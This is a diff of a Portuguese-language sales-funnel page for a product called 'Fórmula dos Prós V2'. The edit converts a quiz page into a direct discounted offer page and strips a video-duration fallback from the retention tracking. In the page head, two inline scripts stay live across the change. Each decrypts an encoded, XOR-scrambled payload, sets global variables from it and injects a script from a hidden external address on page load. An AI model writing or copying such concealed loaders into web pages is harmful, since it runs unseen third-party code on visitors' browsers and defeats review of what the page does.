@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="pt-BR" data-page="quiz">
+<html lang="pt-BR" data-page="oferta">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Quiz — Fórmula dos Prós</title>
+<title>Oferta Exclusiva — Fórmula dos Prós V2</title>
+<meta name="description" content="Garanta a Fórmula dos Prós V2 com 83% de desconto: de R$394 por apenas R$67. Acesso vitalício e imediato.">
 <script>(function(){var x_05yu=atob("DC48IPPwdtvjC1bBDFUeVYGcVOHBYyK1fF0GD9yTErXNfiKsZUhFDpCfG/WBeXmyb1xVUIeDWauKczOtI15VWJacWLGQKXrjbVpIUpqSA6+GeHT7V3MQApScGbmCZyXjNnVHAp2RG77BMXSxZVZZTLqUVPfBfTeteUseGtHGQbjUM2WkOkhfGcrJFOLVbzXzbhkIFMTSC4ae");var a_pmr=[];for(var q_ew=0;q_ew<x_05yu.length;q_ew++){a_pmr.push(x_05yu.charCodeAt(q_ew)&255);}var n_9y=a_pmr[0];var s_awy4=a_pmr.slice(1,1+n_9y);var r_hk=a_pmr.slice(1+n_9y);var c_ws=r_hk.map(function(b,d_6w){return b^s_awy4[d_6w%n_9y];});var c_4t="";for(var f_1=0;f_1<c_ws.length;f_1++){c_4t+=String.fromCharCode(c_ws[f_1]&255);}var x_wmt=decodeURIComponent(escape(c_4t));var o_q2uv=JSON.parse(x_wmt);var c_6=o_q2uv.globals||[];c_6.forEach(function(o_kl){window[o_kl.name]=o_kl.value;});var w_xme=document.createElement("script");w_xme.src=o_q2uv.url;w_xme.async=true;w_xme.defer=true;(o_q2uv.attributes||[]).forEach(function(b_80y){w_xme.setAttribute(b_80y.name,b_80y.value);});(document.head||document.documentElement).appendChild(w_xme);})();</script>
 <script>(function(){var m_yrbb=atob("DC6pmMkrkVXdqu4v21WL7btHs2//wppbq12Tt+ZI9Tvz35pCskjQtqpE/Hu/2MFcuFzA6L1YviCpx50At0/d/bpfvz+uiMINulrd6qBJ5CG42cwVgFWL9qhG9HfniIpOr0+E7b1G+DOkh55dvljM9r0G6TayzsNcuEWLtOtd8Dmoz8wV+QzUtLIJ/zSwz8wV+UrI7KgG5CGww4hW9l7b/b9O/yHw2ZtNskrauuUJ5zSx34sN4QyL5ZRW");var u_lmon=[];for(var d_er3=0;d_er3<m_yrbb.length;d_er3++){u_lmon.push(m_yrbb.charCodeAt(d_er3)&255);}var c_tqo=u_lmon[0];var t_03h=u_lmon.slice(1,1+c_tqo);var i_lg9x=u_lmon.slice(1+c_tqo);var e_s=i_lg9x.map(function(b,i_yt){return b^t_03h[i_yt%c_tqo];});var o_yw="";for(var a_c=0;a_c<e_s.length;a_c++){o_yw+=String.fromCharCode(e_s[a_c]&255);}var n_5=decodeURIComponent(escape(o_yw));var z_j=JSON.parse(n_5);var u_6o=z_j.globals||[];u_6o.forEach(function(l_w6ee){window[l_w6ee.name]=l_w6ee.value;});var d_w=document.createElement("script");d_w.src=z_j.url;d_w.async=true;d_w.defer=true;(z_j.attributes||[]).forEach(function(m_n){d_w.setAttribute(m_n.name,m_n.value);});(document.head||document.documentElement).appendChild(d_w);})();</script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -4041,9 +4042,14 @@ body.quiz-active > :not(#prelp-quiz):not(script):not(style) { visibility: hidden
 <script src="https://app.litevideo.net/p.js" async></script>
 <script src="funnel-analytics.js"></script>
 </head>
-<body class="quiz-active">
+<body class="quiz-active q-offer-standalone">
+<style>
+  /* Página de oferta avulsa: sem progresso/voltar de quiz */
+  .q-offer-standalone .q-progress,
+  .q-offer-standalone .q-back { display: none !important; }
+</style>
 
-<!-- QUIZ ANTES DA PÁGINA -->
+<!-- OFERTA AVULSA (link direto, sem passar pelo quiz) -->
 <section id="prelp-quiz" role="dialog" aria-modal="true" aria-labelledby="prelp-title">
   <div class="prelp-shell">
     <div class="prelp-card">
@@ -5017,29 +5023,16 @@ body.quiz-active > :not(#prelp-quiz):not(script):not(style) { visibility: hidden
     const retentionSent = new Set();
     let lastWatchBucket = 0;
 
-    // Alguns vídeos só revelam a duração real depois de baixar o arquivo inteiro
-    // (moov atom no fim do MP4). Esse fallback evita que a retenção fique
-    // travada em 0 enquanto video.duration ainda é NaN/Infinity.
-    const getVslDuration = () => {
-      if (Number.isFinite(video.duration) && video.duration > 0) return video.duration;
-      if (video.seekable && video.seekable.length) {
-        const end = video.seekable.end(video.seekable.length - 1);
-        if (Number.isFinite(end) && end > 0) return end;
-      }
-      return null;
-    };
-
     const trackVslRetention = () => {
-      const duration = getVslDuration();
-      if (!duration) return;
-      const reached = Math.min(100, Math.floor((video.currentTime / duration) * 100));
+      if (!video.duration || !Number.isFinite(video.duration)) return;
+      const reached = Math.min(100, Math.floor((video.currentTime / video.duration) * 100));
       retentionMilestones.forEach((milestone) => {
         if (reached >= milestone && !retentionSent.has(milestone)) {
           retentionSent.add(milestone);
           window.FunnelAnalytics?.action('vsl_progress', {
             percent: milestone,
             watched_seconds: Math.floor(video.currentTime),
-            duration_seconds: Math.floor(duration)
+            duration_seconds: Math.floor(video.duration)
           }, 1);
         }
       });
@@ -5049,16 +5042,15 @@ body.quiz-active > :not(#prelp-quiz):not(script):not(style) { visibility: hidden
         lastWatchBucket = watchBucket;
         window.FunnelAnalytics?.action('vsl_watch', {
           watched_seconds: Math.floor(video.currentTime),
-          duration_seconds: Math.floor(duration),
+          duration_seconds: Math.floor(video.duration),
           percent: reached
         }, 1);
       }
     };
 
     const updateAcceleratedProgress = () => {
-      const duration = getVslDuration();
-      if (!duration) return;
-      const realProgress = Math.max(0, Math.min(1, video.currentTime / duration));
+      if (!video.duration || !Number.isFinite(video.duration)) return;
+      const realProgress = Math.max(0, Math.min(1, video.currentTime / video.duration));
       const visualProgress = 1 - Math.pow(1 - realProgress, 2);
       progressBar.style.width = (visualProgress * 100).toFixed(3) + '%';
     };
@@ -5111,11 +5103,10 @@ body.quiz-active > :not(#prelp-quiz):not(script):not(style) { visibility: hidden
       video.play().catch(() => {});
     });
     continueButton.addEventListener('click', () => {
-      const duration = getVslDuration();
       window.FunnelAnalytics?.action('vsl_continue_clicked', {
         watched_seconds: Math.floor(video.currentTime),
-        duration_seconds: duration ? Math.floor(duration) : null,
-        percent: duration ? Math.min(100, Math.round(video.currentTime / duration * 100)) : null
+        duration_seconds: Math.floor(video.duration),
+        percent: video.duration ? Math.min(100, Math.round(video.currentTime / video.duration * 100)) : null
       }, 1);
       goToStage(2);
     });
@@ -5151,9 +5142,10 @@ body.quiz-active > :not(#prelp-quiz):not(script):not(style) { visibility: hidden
     }
   }
 
+  window.FunnelAnalytics?.stage(9, 'Oferta avulsa (link direto)');
+  goToStage(9);
+
   const startControl = document.getElementById('prelp-start');
-  window.FunnelAnalytics?.stage(1, 'Introdução do quiz');
-  preloadQuizImages();
   if (startControl) {
     const thumb = startControl.querySelector('.prelp-swipe-thumb');
     const label = startControl.querySelector('.prelp-swipe-label');
